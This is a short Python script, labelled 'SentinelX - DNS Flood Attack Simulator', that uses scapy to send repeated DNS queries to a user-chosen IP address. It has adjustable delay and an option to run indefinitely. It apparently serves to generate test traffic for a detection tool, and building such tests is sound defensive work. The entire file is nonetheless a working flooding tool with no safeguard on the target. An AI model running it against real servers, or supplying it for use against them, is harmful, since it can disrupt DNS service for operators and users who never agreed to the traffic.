import argparse
import time
from scapy.all import IP, UDP, DNS, DNSQR, send

parser = argparse.ArgumentParser(description="SentinelX - DNS Flood Attack Simulator")
parser.add_argument("--target", required=True, help="Target IP address (DNS Server)")
parser.add_argument("--count", type=int, default=150, help="Number of packets to send (0 for infinite)")
parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
args = parser.parse_args()

print(f"[*] Starting DNS Flood against {args.target}:53")
if args.count == 0:
    print(f"[*] Sending DNS queries indefinitely with {args.delay}s delay... (Press Ctrl+C to stop)")
else:
    print(f"[*] Sending {args.count} DNS queries with {args.delay}s delay...")

try:
    packet = IP(dst=args.target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
    sent = 0
    while args.count == 0 or sent < args.count:
        send(packet, verbose=0)
        sent += 1
        if args.delay > 0:
            time.sleep(args.delay)
    print(f"\n[+] Attack simulation completed. Sent {sent} packets.")
except KeyboardInterrupt:
    print(f"\n[!] Attack aborted by user. Sent {sent} packets.")
except Exception as e:
    print(f"\n[!] Error: {e}")
